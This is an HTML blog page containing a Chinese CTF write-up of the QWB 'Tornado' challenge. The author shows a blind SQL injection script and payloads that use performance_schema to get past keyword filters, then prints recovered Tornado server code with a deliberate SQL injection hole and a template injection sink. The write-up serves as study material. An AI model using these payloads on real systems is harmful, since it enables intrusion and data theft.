@@ -1,0 +1,233 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>QWB托纳多 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="考点：
+
+mysql储存引擎新活
+SSTI绕过
+
+有一个登陆的地方有一个注册的地方，我们如果重复注册用户名的话会报错，那么可以推测源码中先进行了
+1select username from xxx ,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">QWB托纳多</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">QWB托纳多</h1>
+        <div class="stuff">
+            <span>六月 25, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/MYSQL/" rel="tag">MYSQL</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>考点：</p>
+<ul>
+<li>mysql储存引擎新活</li>
+<li>SSTI绕过</li>
+</ul>
+<p>有一个登陆的地方有一个注册的地方，我们如果重复注册用户名的话会报错，那么可以推测源码中先进行了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> xxx <span class="keyword">where</span> username = <span class="string">&#x27;xxx&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果username没有重复的再</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> xx (<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>   ) <span class="keyword">values</span> (xxx);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>登陆的时候就进行查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxx <span class="keyword">where</span> username = <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>那我们需要保证的是两边都不报错，最简单的方法就是注册一个用户为admin’’ ，同时密码为admin 即可登陆成功。。但我不知道为什么</p>
+<p>这里主要是出题人过滤了tables coluns等关键字，导致我们无法直接注入出来表的节构，在这种情况下就需要介绍一下PERFORMANCE_SCHEMA引擎了。</p>
+<p><img src="image-20210625153703936.png" alt="image-20210625153703936"></p>
+<p>官方的解释是该库主要是用于储存数据库的元数据，我们可以用navicat看一下这个库</p>
+<p><img src="image-20210625153937120.png" alt="image-20210625153937120"></p>
+<p>其中有一个表file_instances会储存各类数据库的文件路径，故我们若能对其进行查询，就可以得到所有的表名了。</p>
+<p><img src="image-20210625154443043.png" alt="image-20210625154443043"></p>
+<p>表的节构则是通过查看events_statements_summary_by_digest 表，该表会记录所有的sql执行语句，通过随便捏两个登录，注册·等语句就会被记录到该表里面了，所以我们再注入即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (DIGEST_TEXT) FROM performance_schema.events_statements_summary_by_digest</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210625154807355.png" alt="image-20210625154807355"></p>
+<p>接下来就是去捏一个语句了,发现等号，大于号，小于号都被ban了，但我们可以用in语句进行绕过</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or  if(1&gt;0,1,0)  or &#x27;0</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210625160455963.png" alt="image-20210625160455963"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">for a in  range(1,300):</span><br><span class="line">    for i in range(130,-1,-1):</span><br><span class="line">        if(i&lt;30):</span><br><span class="line">            exit(0)</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;f96ea2c5-35a7-444f-8eee-4a086e4797dd.node3.buuoj.cn&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select group_concat(qwbqwbqwbuser,0x7e,qwbqwbqwbpass)  FROM qwbtttaaab111e ),&quot; + str(a) + &quot;,1)) in (&quot; + str(i) + &quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        #admin~we111c000me_to_qwb</span><br><span class="line">        #url &#x3D; &quot;http:&#x2F;&#x2F;eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select (DIGEST_TEXT)  FROM performance_schema.events_statements_summary_by_digest where SCHEMA_NAME in (&#39;qwb&#39;) limit 2,1),&quot;+str(a)+&quot;,1)) in (&quot;+str(i)+&quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        #INSERT INTO &#96;qwbtttaaab111e&#96; ( &#96;qwbqwbqwbuser&#96; , &#96;qwbqwbqwbpass&#96; ) VALUES (...)</span><br><span class="line">        #url &#x3D; &quot;http:&#x2F;&#x2F;eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select (file_name)  FROM performance_schema.file_instances limit 150,1),&quot;+str(a)+&quot;,1)) in (&quot;+str(i)+&quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        if &#39;this username&#39; in r.text:</span><br><span class="line">            print(chr(i),end&#x3D;&#39;&#39;)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            if(&#39;success&#39; in r.text):</span><br><span class="line">                pass</span><br><span class="line">            else:</span><br><span class="line">                print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>之后把源码能够搞出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop, tornado.web, tornado.options, pymysql, os, re</span><br><span class="line">settings = &#123;<span class="string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="string">&#x27;static&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;b93a9960-bfc0-11eb-b600-002b677144e0&#x27;</span>&#125;</span><br><span class="line">db_username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">db_password = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>) == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(<span class="string">&#x27;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s&#x27;</span>, [username, password])</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> results[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                    self.set_secure_cookie(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.finish(<span class="string">&#x27;&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cursor.close()</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        word_bans = [<span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;inno&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>]</span><br><span class="line">        bans = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> word_bans:</span><br><span class="line">            <span class="keyword">if</span> re.search(ban, username, re.IGNORECASE):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> username:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;%s&#x27;&quot;</span> % username)</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&#x27;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)&#x27;</span>, [username, password])</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&quot;&lt;script&gt;alert(`success`);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.rollback()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogoutHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.clear_all_cookies()</span><br><span class="line">        self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/index.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        image_name = self.get_argument(<span class="string">&#x27;qwb_image_name&#x27;</span>, <span class="string">&#x27;header.jpeg&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> image_name:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> image_name.endswith(<span class="string">&#x27;.py&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> image_name <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> image_name:</span><br><span class="line">                self.finish(<span class="string">&quot;nonono, you can&#x27;t read it.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            image_name = os.path.join(os.getcwd() + <span class="string">&#x27;/image&#x27;</span>, image_name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(image_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                img = f.read()</span><br><span class="line">            self.set_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">            self.finish(img)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tornado.web.RequestHandler._template_loaders):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line">        msg = self.get_argument(<span class="string">&#x27;congratulations&#x27;</span>, <span class="string">&#x27;oh! you find it&#x27;</span>)</span><br><span class="line">        bans = []</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> msg:</span><br><span class="line">                self.finish(<span class="string">&#x27;bad hack,go out!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;congratulations.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">            f.write(<span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)</span><br><span class="line">            f.flush()</span><br><span class="line">        self.render(<span class="string">&#x27;congratulations.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_app</span>():</span></span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/index.php&#x27;</span>, MainHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/login.php&#x27;</span>, LoginHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/logout.php&#x27;</span>, LogoutHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/register.php&#x27;</span>, RegisterHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/admin.php&#x27;</span>, AdminHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/qwbimage.php&#x27;</span>, ImageHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/good_job_my_ctfer.php&#x27;</span>, SecretHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/&#x27;</span>, MainHandler)], **settings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line">    print(<span class="string">&#x27;start&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>太迷惑了。。我读不出来东西</p>
+<p><img src="image-20210625173437381.png" alt="image-20210625173437381"></p>
+<p><img src="image-20210625173452887.png" alt="image-20210625173452887"></p>
+<p><img src="image-20210625173501193.png" alt="image-20210625173501193"></p>
+<p>被这题折腾了一天了，实在是心烦意乱没有心情继续了。摸了！</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+				
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
